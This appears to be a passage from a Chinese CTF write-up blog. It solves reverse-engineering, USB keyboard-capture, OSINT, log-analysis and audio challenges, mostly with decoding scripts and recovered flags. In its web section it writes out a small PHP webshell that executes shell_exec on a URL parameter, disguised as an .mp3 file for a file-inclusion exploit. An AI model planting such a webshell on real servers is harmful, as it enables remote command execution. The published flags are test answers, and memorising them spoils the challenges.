<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def tea_decrypt(v, k):</span><br><span class="line">    v0, v1 = v</span><br><span class="line">    delta = 0x9E3779B9</span><br><span class="line">    sum_ = (delta * 32) &amp; 0xffffffff</span><br><span class="line">    for _ in range(32):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum_) ^ ((v0 &gt;&gt; 5) + k[3]))) &amp; 0xffffffff</span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum_) ^ ((v1 &gt;&gt; 5) + k[1]))) &amp; 0xffffffff</span><br><span class="line">        sum_ = (sum_ - delta) &amp; 0xffffffff</span><br><span class="line">    return v0, v1</span><br><span class="line"></span><br><span class="line"># 初始 ng</span><br><span class="line">ng = [ord(c) for c in &quot;sp\177vuctp|xeb|hv~&quot;]</span><br><span class="line"></span><br><span class="line">def to_uint32(x): return x &amp; 0xffffffff</span><br><span class="line">ezgm = [</span><br><span class="line">    1210405119, 710975774, -90350153, -1958008304,</span><br><span class="line">    -745722482, 67707510, -86515270, -1728462407</span><br><span class="line">]</span><br><span class="line">ezgm = [to_uint32(x) for x in ezgm]</span><br><span class="line"></span><br><span class="line">flag = b&quot;&quot;</span><br><span class="line">for i in range(0, len(ezgm), 2):</span><br><span class="line">    # 每次 fn 调用前，ng[i] ^= 17</span><br><span class="line">    ng = [b ^ 0x11 for b in ng]</span><br><span class="line">    key = struct.unpack(&quot;&lt;4I&quot;, bytes(ng[:16]))</span><br><span class="line">    v0, v1 = tea_decrypt((ezgm[i], ezgm[i+1]), key)</span><br><span class="line">    flag += struct.pack(&quot;&lt;2I&quot;, v0, v1)</span><br><span class="line"></span><br><span class="line">print(&quot;十六进制:&quot;, flag.hex())</span><br><span class="line">try:</span><br><span class="line">    print(&quot;flag&#123;&quot; + flag.decode(&#x27;utf-8&#x27;) + &quot;&#125;&quot;)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;flag&#123;&quot; + flag.decode(&#x27;latin1&#x27;) + &quot;&#125;&quot;)</span><br><span class="line">--&gt; flag&#123;4553m81y_5_s0o0o0_345y_jD5yQ5mD9&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Look-at-me-carefully"><a href="#Look-at-me-carefully" class="headerlink" title="Look at me carefully"></a>Look at me carefully</h3><p>发现和flag有关的加密段</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="42.png" alt="42"></p>
<p>还原脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char v7[] = &quot;cH4_1elo&#123;ookte?0dv_&#125;alafle___5yygume&quot;; // 程序里 v7 的常量</span><br><span class="line">    int order[36] = &#123;</span><br><span class="line">      27,5,6,9,28,8,1,11,4,15,29,17,22,18,34,16,</span><br><span class="line">      19,7,13,35,2,14,21,0,32,25,20,23,26,30,10,33,3,12,24,31</span><br><span class="line">    &#125;;</span><br><span class="line">    char v8[37];</span><br><span class="line">    memset(v8, 0, sizeof(v8));</span><br><span class="line">    for (int k = 0; k &lt; 36; ++k) &#123;</span><br><span class="line">        v8[ order[k] ] = v7[k];</span><br><span class="line">    &#125;</span><br><span class="line">    v8[36] = &#x27;\0&#x27;;</span><br><span class="line">    printf(&quot;reconstructed flag: %s\n&quot;, v8);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="re-尤皮·埃克斯历险记（1）"><a href="#re-尤皮·埃克斯历险记（1）" class="headerlink" title="[re] 尤皮·埃克斯历险记（1）"></a>[re] 尤皮·埃克斯历险记（1）</h3><p>明显暗示改exe经过了upx加密 要去壳<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="41.png" alt="41"><br>ida启动 通过主程序与encrypt函数 反推出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encrypt(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // rax</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-40h] BYREF</span><br><span class="line">  char v5; // [rsp+27h] [rbp-19h] BYREF</span><br><span class="line">  char *v6; // [rsp+28h] [rbp-18h]</span><br><span class="line">  char v7; // [rsp+37h] [rbp-9h]</span><br><span class="line">  unsigned __int64 i; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = (char *)&amp;v4 + 39;</span><br><span class="line">  std::string::basic_string&lt;std::allocator&lt;char&gt;&gt;(a1, &amp;unk_1400C7000, v6);</span><br><span class="line">  std::__new_allocator&lt;char&gt;::~__new_allocator(&amp;v5);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::string::length(a2);</span><br><span class="line">    if ( i &gt;= v2 )</span><br><span class="line">      break;</span><br><span class="line">    v7 = *(_BYTE *)std::string::operator[](a2, i);</span><br><span class="line">    if ( (unsigned int)(v7 - 48) &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( islower(v7) || isupper(v7) )</span><br><span class="line">        std::string::operator+=(a1, (unsigned int)(char)(-69 - v7));</span><br><span class="line">      else</span><br><span class="line">        std::string::operator+=(a1, (unsigned int)v7);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      std::string::operator+=(a1, (unsigned int)(char)(105 - v7));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a1;</span><br><span class="line">&#125;</span><br><span class="line">## 脚本</span><br><span class="line">expected = bytes.fromhex(</span><br><span class="line">  &quot;69736668474a09747e63550a790a75546a636a09547e636a5164757e777b04057141&quot;</span><br><span class="line">)  # 题目中内存的 34 字节 expected</span><br><span class="line"></span><br><span class="line">desired_v8 = bytes([b ^ 0x3C for b in expected])</span><br><span class="line"></span><br><span class="line">def encrypt_char(v7):</span><br><span class="line">    # v7: int 0-255</span><br><span class="line">    if (v7 - 48) &amp; 0xFFFFFFFF &gt; 9:</span><br><span class="line">        ch = chr(v7)</span><br><span class="line">        if ch.islower() or ch.isupper():</span><br><span class="line">            return ((-69 - v7) &amp; 0xFF)</span><br><span class="line">        else:</span><br><span class="line">            return v7</span><br><span class="line">    else:</span><br><span class="line">        return (105 - v7) &amp; 0xFF</span><br><span class="line"></span><br><span class="line"># 逐字反推</span><br><span class="line">res = []</span><br><span class="line">for out in desired_v8:</span><br><span class="line">    found = None</span><br><span class="line">    for c in range(32, 127):   # 可打印 ASCII</span><br><span class="line">        if encrypt_char(c) == out:</span><br><span class="line">            found = chr(c)</span><br><span class="line">            break</span><br><span class="line">    if found is None:</span><br><span class="line">        raise Exception(&quot;no candidate for byte %02x&quot; % out)</span><br><span class="line">    res.append(found)</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;.join(res)</span><br><span class="line">print(flag)   # -&gt; flag&#123;E4sy_R3v3rSe_e4Sy_eNcrypt10n&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISC城邦-NewKeyboard"><a href="#MISC城邦-NewKeyboard" class="headerlink" title="MISC城邦-NewKeyboard"></a>MISC城邦-NewKeyboard</h3><p>附件中有俩文件<code>abcdefghijklmnopqrstuvwxyz1234567890-_!&#123;&#125;.pcapng</code>与<code>newkeyboard.pcapng</code><br>逻辑是前者提供了键盘依次按下<code>abcdefghijklmnopqrstuvwxyz1234567890-_!&#123;&#125;</code>发送的包<br>后者则是键盘按下flag信息发送的包<br>用wireshark结合cmd输出有用的信息 并通过脚本比对</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">tshark -r newkeyboard.pcapng -T fields -e usbhid.data -Y &quot;usbhid.data&quot;</span><br><span class="line">//筛选出所有包含 USB HID 数据的包，然后只打印每个匹配包的 usbhid.data 字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import sys, re</span><br><span class="line">from collections import defaultdict</span><br><span class="line"></span><br><span class="line"># The character sequence defined by the challenge (in order)</span><br><span class="line">CHARSEQ = list(&quot;abcdefghijklmnopqrstuvwxyz1234567890-_!&#123;&#125;&quot;)</span><br><span class="line"></span><br><span class="line">HEX_RUN = re.compile(r&#x27;[0-9A-Fa-f]+&#x27;)</span><br><span class="line"></span><br><span class="line">def read_hex_lines_loose(path):</span><br><span class="line">    &quot;&quot;&quot;Read file and return list of pure-hex strings (lowercase), skip blank lines.</span><br><span class="line">       Accepts lines containing offsets or other text; extracts hex runs and concatenates them.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    out = []</span><br><span class="line">    with open(path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f:</span><br><span class="line">        for line in f:</span><br><span class="line">            s = line.strip()</span><br><span class="line">            if not s:</span><br><span class="line">                continue</span><br><span class="line">            # find all hex runs and join them (this handles lines like &quot;0000  01 00 02 ...  &quot;)</span><br><span class="line">            runs = HEX_RUN.findall(s)</span><br><span class="line">            if not runs:</span><br><span class="line">                continue</span><br><span class="line">            hexline = &#x27;&#x27;.join(runs).lower()</span><br><span class="line">            # require even length and at least 2 bytes</span><br><span class="line">            if len(hexline) &gt;= 4 and len(hexline) % 2 == 0:</span><br><span class="line">                out.append(hexline)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def combined_val_from_report_hex(hexline):</span><br><span class="line">    &quot;&quot;&quot;Combine bytes from index 2 onward (3rd byte) into a little-endian integer.</span><br><span class="line">       hexline is a continuous hex string like &#x27;0100000200...&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # ensure even length</span><br><span class="line">    blen = len(hexline) // 2</span><br><span class="line">    # convert to bytes list</span><br><span class="line">    b = [int(hexline[i:i+2], 16) for i in range(0, len(hexline), 2)]</span><br><span class="line">    # combine from index 2 onward</span><br><span class="line">    val = 0</span><br><span class="line">    shift = 0</span><br><span class="line">    for byte in b[2:]:</span><br><span class="line">        val |= (byte &lt;&lt; shift)</span><br><span class="line">        shift += 8</span><br><span class="line">    return val</span><br><span class="line"></span><br><span class="line">def build_bitpos_to_char_map(map_lines):</span><br><span class="line">    &quot;&quot;&quot;From mapping lines, build bitpos -&gt; char mapping.</span><br><span class="line">       We iterate map_lines and for each NON-ZERO mapping line we map the next CHARSEQ char</span><br><span class="line">       to all set bits in that line (first appearance wins for a specific bit).</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    bitpos_to_char = &#123;&#125;</span><br><span class="line">    used_chars = []</span><br><span class="line">    char_index = 0</span><br><span class="line">    for line in map_lines:</span><br><span class="line">        # skip fully-empty reports</span><br><span class="line">        try:</span><br><span class="line">            v_check = int(line[2:], 16)  # check bytes after modifier</span><br><span class="line">        except Exception:</span><br><span class="line">            v_check = 0</span><br><span class="line">        if v_check == 0:</span><br><span class="line">            continue</span><br><span class="line">        if char_index &gt;= len(CHARSEQ):</span><br><span class="line">            break</span><br><span class="line">        ch = CHARSEQ[char_index]</span><br><span class="line">        v = combined_val_from_report_hex(line)</span><br><span class="line">        pos = 0</span><br><span class="line">        vv = v</span><br><span class="line">        while vv:</span><br><span class="line">            if vv &amp; 1:</span><br><span class="line">                if pos not in bitpos_to_char:</span><br><span class="line">                    bitpos_to_char[pos] = ch</span><br><span class="line">            vv &gt;&gt;= 1</span><br><span class="line">            pos += 1</span><br><span class="line">        used_chars.append(ch)</span><br><span class="line">        char_index += 1</span><br><span class="line">    return bitpos_to_char, used_chars</span><br><span class="line"></span><br><span class="line">def decode_keylog(bitpos_to_char, log_lines):</span><br><span class="line">    &quot;&quot;&quot;Decode keylog into a string using bitpos_to_char mapping.</span><br><span class="line">       Only append characters for *newly pressed* bits (v &amp; ~last_v).</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    last_v = 0</span><br><span class="line">    out = []</span><br><span class="line">    unmapped = defaultdict(int)</span><br><span class="line">    for i, line in enumerate(log_lines):</span><br><span class="line">        v = combined_val_from_report_hex(line)</span><br><span class="line">        if v == 0:</span><br><span class="line">            last_v = 0</span><br><span class="line">            continue</span><br><span class="line">        new_bits = v &amp; (~last_v)</span><br><span class="line">        if new_bits == 0:</span><br><span class="line">            last_v = v</span><br><span class="line">            continue</span><br><span class="line">        pos = 0</span><br><span class="line">        vv = new_bits</span><br><span class="line">        while vv:</span><br><span class="line">            if vv &amp; 1:</span><br><span class="line">                if pos in bitpos_to_char:</span><br><span class="line">                    out.append(bitpos_to_char[pos])</span><br><span class="line">                else:</span><br><span class="line">                    out.append(&#x27;?&#x27;)</span><br><span class="line">                    unmapped[pos] += 1</span><br><span class="line">            vv &gt;&gt;= 1</span><br><span class="line">            pos += 1</span><br><span class="line">        last_v = v</span><br><span class="line">    return &#x27;&#x27;.join(out), unmapped</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) != 3:</span><br><span class="line">        print(&quot;Usage: python decode_custom_hid.py keymap.txt keylog.txt&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    keymap_file = sys.argv[1]</span><br><span class="line">    keylog_file = sys.argv[2]</span><br><span class="line"></span><br><span class="line">    map_lines = read_hex_lines_loose(keymap_file)</span><br><span class="line">    log_lines = read_hex_lines_loose(keylog_file)</span><br><span class="line"></span><br><span class="line">    if not map_lines:</span><br><span class="line">        print(&quot;Error: keymap.txt 没有任何有效 hex 数据 (请检查文件内容/路径)&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    if not log_lines:</span><br><span class="line">        print(&quot;Error: keylog.txt 没有任何有效 hex 数据 (请检查文件内容/路径)&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    bitpos_to_char, used_chars = build_bitpos_to_char_map(map_lines)</span><br><span class="line"></span><br><span class="line">    print(&quot;已建立 bitpos -&gt; char（示例前 50）：&quot;)</span><br><span class="line">    for p in sorted(bitpos_to_char.keys())[:50]:</span><br><span class="line">        print(f&quot;  bit &#123;p:3d&#125; -&gt; &#123;bitpos_to_char[p]&#125;&quot;)</span><br><span class="line">    print(&quot;映射所用字符（顺序）:&quot;, &#x27;&#x27;.join(used_chars))</span><br><span class="line">    print(&quot;---- 解码中 ----&quot;)</span><br><span class="line"></span><br><span class="line">    decoded, unmapped = decode_keylog(bitpos_to_char, log_lines)</span><br><span class="line">    print(&quot;\nDecoded string:&quot;)</span><br><span class="line">    print(decoded)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    if unmapped:</span><br><span class="line">        print(&quot;未映射的 bit positions (pos:count):&quot;)</span><br><span class="line">        for p,c in sorted(unmapped.items()):</span><br><span class="line">            print(f&quot;  &#123;p:3d&#125; : &#123;c&#125;&quot;)</span><br><span class="line">        print(&quot;\n注意: 未映射位会以 &#x27;?&#x27; 出现在输出中。若存在未映射位，可把 keymap.txt 的更多有效行粘入使其映射到 CHARSEQ。&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;所有出现的 bit 都已映射。&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="35.png" alt="35"><br>最终得到flag</p>
<h3 id="OSINT-威胁情报"><a href="#OSINT-威胁情报" class="headerlink" title="OSINT-威胁情报"></a>OSINT-威胁情报</h3><p>hash:2c796053053a571e9f913fd5bae3bb45e27a9f510eace944af4b331e802a4ba0<br>利用查询情报平台VirusTotal查看该文件的信息<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="34.png" alt="34"></p>
<p>最终拼凑出flag{kimsuky_alps.travelmountain.ml_2021-03-31}</p>
<h3 id="日志分析-不敬者的闯入"><a href="#日志分析-不敬者的闯入" class="headerlink" title="日志分析-不敬者的闯入"></a>日志分析-不敬者的闯入</h3><p>分析日志发现&#x2F;admin 获取flag<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="24.png" alt="24"></p>
<h3 id="星期四的狂想"><a href="#星期四的狂想" class="headerlink" title="星期四的狂想"></a>星期四的狂想</h3><p>分析数据包 发现一段类似加密逻辑的PHP代码<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="18.png" alt="18"><br>这段代码的意思是flag先是被base64加密了 随后每隔10个字符为一段 进行了随机的strrev（字符反转）或<code>str_rot13</code>（ROT13)加密<br>最后赋值于$hahahahahaha 最后这段密文再base64加密一次 通过Cookie:token&#x3D;被传出去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 利用wireshark的过滤语法来搜索一下</span><br><span class="line">http.cookie contains &quot;token=&quot;</span><br></pre></td></tr></table></figure>

<p>然后找到密文<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="19.png" alt="19"><br>解密程序就写个脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># decode_token.py</span><br><span class="line">import base64, codecs</span><br><span class="line"></span><br><span class="line">TOKEN = &quot;R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==&quot;  # &lt;- 替换为 pcap 中的 token</span><br><span class="line"></span><br><span class="line">def rot13(s):</span><br><span class="line">    return codecs.decode(s, &#x27;rot_13&#x27;)</span><br><span class="line"></span><br><span class="line">def try_decode(token):</span><br><span class="line">    try:</span><br><span class="line">        s = base64.b64decode(token).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        s_bytes = base64.b64decode(token)</span><br><span class="line">        s = &#x27;&#x27;.join(chr(b) for b in s_bytes)</span><br><span class="line">    print(&quot;第一层 base64 解出：&quot;, repr(s))</span><br><span class="line">    chunks = [s[i:i+10] for i in range(0, len(s), 10)]</span><br><span class="line">    print(&quot;分块数:&quot;, len(chunks))</span><br><span class="line">    n = len(chunks)</span><br><span class="line">    total = 1 &lt;&lt; n</span><br><span class="line">    print(&quot;穷举组合数:&quot;, total)</span><br><span class="line">    found = 0</span><br><span class="line">    for mask in range(total):</span><br><span class="line">        parts = []</span><br><span class="line">        for i in range(n):</span><br><span class="line">            if (mask &gt;&gt; i) &amp; 1:</span><br><span class="line">                parts.append(chunks[i][::-1])</span><br><span class="line">            else:</span><br><span class="line">                parts.append(rot13(chunks[i]))</span><br><span class="line">        candidate = &#x27;&#x27;.join(parts)</span><br><span class="line">        try:</span><br><span class="line">            dec = base64.b64decode(candidate)</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">        # 过滤：包含 flag&#123; 或 全部为可打印 ascii</span><br><span class="line">        if b&#x27;flag&#123;&#x27; in dec.lower() or all(32 &lt;= b &lt; 127 for b in dec):</span><br><span class="line">            print(&quot;---- 可能结果 mask:&quot;, bin(mask))</span><br><span class="line">            print(&quot;candidate (重组后 base64 字符串):&quot;, candidate)</span><br><span class="line">            try:</span><br><span class="line">                print(&quot;decoded -&gt;&quot;, dec.decode(&#x27;utf-8&#x27;))</span><br><span class="line">            except:</span><br><span class="line">                print(&quot;decoded bytes -&gt;&quot;, dec)</span><br><span class="line">            found += 1</span><br><span class="line">    print(&quot;共找到候选:&quot;, found)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    try_decode(TOKEN)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="21.png" alt="21"><br>有了</p>
<h3 id="美妙的音乐"><a href="#美妙的音乐" class="headerlink" title="美妙的音乐"></a>美妙的音乐</h3><p>丢到音频分析软件里边 flag藏在音谱里</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="22.png" alt="22"></p>
<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="白帽小K的故事（1）"><a href="#白帽小K的故事（1）" class="headerlink" title="白帽小K的故事（1）"></a>白帽小K的故事（1）</h3><p>可以用文件包含的逻辑来做</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//构建一个简单的webshell,改名为shell.mp3</span><br><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    echo shell_exec($_GET[&#x27;c&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &#x27;SHELL_UP&#x27;;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="38.png" alt="38"><br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="39.png" alt="39"></p>
